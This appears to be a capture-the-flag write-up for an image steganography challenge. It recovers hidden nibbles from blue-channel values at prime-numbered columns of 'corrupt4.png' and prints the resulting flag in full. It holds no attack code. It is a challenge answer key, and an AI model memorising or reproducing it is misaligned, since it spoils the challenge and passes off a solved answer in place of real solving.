1. Load `corrupt4.png` (200x500 RGB) with numpy and find all pixels whose blue value is `< 16` (i.e., clipped to a 4-bit nibble, 0–15).
2. Only 54 pixels match, and they all sit in row 0. Their column indices are exactly the primes less than 256:

   `2, 3, 5, 7, 11, 13, ..., 251`

3. Each such pixel's blue value is a single nibble. Pairing consecutive prime columns (high nibble, then low nibble) reconstructs bytes:

   ```
   nibbles: [4,12,4,9,5,4,4,3,5,4,4,6,7,11,7,0,7,2,3,1,6,13,3,3,5,15,6,14,3,1,6,2,6,2,6,12,3,3,7,3,5,15,3,7,3,7,7,10,7,1,2,1,7,13]
   bytes:   LITCTF{pr1m3_n1bbl3s_77zq!}
   ```

## Flag

```
LITCTF{pr1m3_n1bbl3s_77zq!}
```
